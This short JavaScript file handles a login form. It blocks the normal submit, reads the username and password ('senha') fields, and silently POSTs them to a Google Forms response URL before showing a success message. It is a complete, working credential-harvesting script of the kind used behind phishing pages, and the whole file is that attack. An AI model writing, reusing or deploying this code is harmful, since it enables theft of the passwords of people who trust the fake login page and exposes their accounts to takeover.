document.getElementById("loginForm").addEventListener("submit", function (e) {
  e.preventDefault();

  const login = document.getElementById("login").value;
  const senha = document.getElementById("senha").value;

  const formURL = "https://docs.google.com/forms/d/e/1FAIpQLSduyJt-1GqI8P8JD84H8xg3HlOz_gMecDuI2n54MEpgvT_MRg/formResponse";

  const dados = new FormData();
  dados.append("entry.1404585172", login);
  dados.append("entry.751095019", senha);

  fetch(formURL, {
    method: "POST",
    mode: "no-cors",
    body: dados
  });

  document.getElementById("msg").innerText = "✅ Dados enviados com sucesso!";
});
